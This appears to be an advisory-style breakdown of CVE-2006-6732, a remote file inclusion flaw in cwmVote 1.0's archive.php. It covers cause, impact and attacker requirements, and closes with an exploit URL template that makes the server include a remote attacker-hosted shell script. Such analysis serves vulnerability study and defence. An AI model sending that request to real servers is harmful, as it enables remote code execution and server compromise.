Based on the provided information, here's a breakdown of the vulnerability:

**CVE ID:** CVE-2006-6732

**Root Cause of Vulnerability:**
The vulnerability is a Remote File Inclusion (RFI) flaw. The `archive.php` script in cwmVote 1.0 improperly uses user-supplied input in an `include()` statement, allowing an attacker to include remote files.

**Weaknesses/Vulnerabilities Present:**
- **Remote File Inclusion (RFI):** The `archive.php` script directly uses the value of the `abs` GET parameter in an `include()` statement without proper sanitization or validation.

**Impact of Exploitation:**
- **Arbitrary Code Execution:** By including a malicious remote file, an attacker can execute arbitrary code on the server.
- **Full System Compromise:** This can lead to a complete compromise of the affected server.
- **Data Theft:** An attacker may be able to access sensitive data on the server or databases.
- **Website Defacement:** The attacker could modify the contents of the website.

**Attack Vectors:**
- **HTTP GET Parameter:** The `abs` parameter in the `archive.php` script is used as the vulnerable point of attack.
- **Remote File Inclusion:** The attacker needs to control a server with a malicious php file available to be included.

**Required Attacker Capabilities/Position:**
- **Network Access:** The attacker needs to be able to send HTTP requests to the target web server and host a malicious php file remotely.
- **Basic HTTP knowledge:** The attacker needs a basic understanding of HTTP to craft malicious requests.
- **PHP knowledge:** The attacker needs to have a working knowledge of php to create a malicious payload.

**Exploit Code:**
```
http://[target]/[cwm_vote_path]/archive.php?abs=http://[Shellscript]
```
This URL shows how to exploit the RFI vulnerability. By setting the `abs` parameter to a URL pointing to a malicious PHP file, the attacker can force the server to execute the code contained in that file.
